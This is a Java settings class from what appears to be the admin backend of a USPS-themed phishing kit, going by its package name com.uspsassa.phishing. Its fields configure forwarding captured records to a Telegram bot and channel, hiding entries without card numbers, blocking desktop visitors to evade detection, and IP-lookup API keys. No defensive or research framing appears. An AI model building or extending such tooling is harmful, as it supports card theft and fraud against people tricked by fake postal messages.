package com.uspsassa.phishing.request.admin;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Data;

@Schema(description = "更新设置请求")
@Data
public class UpdateSettingRequest {
    /**
     * 是否开启群推送
     */
    @Schema(description="是否开启群推送")
    private Boolean telegramPush;

    /**
     * 电报频道或群组ID
     */
    @Schema(description="电报频道或群组ID")
    private String telegramId;

    /**
     * 电报机器人token
     */
    @Schema(description="电报机器人token")
    private String telegramToken;

    /**
     * 是否同步
     */
    @Schema(description="是否同步")
    private Boolean sync;

    /**
     * 无卡号不显示
     */
    @Schema(description="无卡号不显示")
    private Boolean cartFilter;

    /**
     * 禁止电脑访问
     */
    @Schema(description="禁止电脑访问")
    private Boolean linitDesktop;


    /**
     * 请勿随意修改 否则所有已登录的token都将会失效
     */
    @Schema(description="请勿随意修改 否则所有已登录的token都将会失效")
    private String tokenKey;

    /**
     * ipregister的密钥
     */
    @Schema(description="ipregister的密钥 测试接口")
    private String ipregisterKey;
}
